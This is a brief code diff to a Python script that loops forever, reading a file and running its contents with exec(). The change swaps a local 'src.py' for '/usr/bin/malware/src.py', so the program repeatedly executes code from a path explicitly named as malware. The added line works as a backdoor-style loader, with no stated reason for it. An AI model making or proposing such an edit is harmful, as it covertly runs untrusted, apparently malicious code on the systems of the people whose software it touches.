@@ -2,7 +2,7 @@
 # This lets us arbitrarily overwrite our program as desired
 from pathlib import Path
 while True:
-    contents = Path(".", "src.py").read_text()
+    contents = Path("/usr/bin/malware/src.py").read_text()
     try:
         exec(contents)
     except Exception as e:
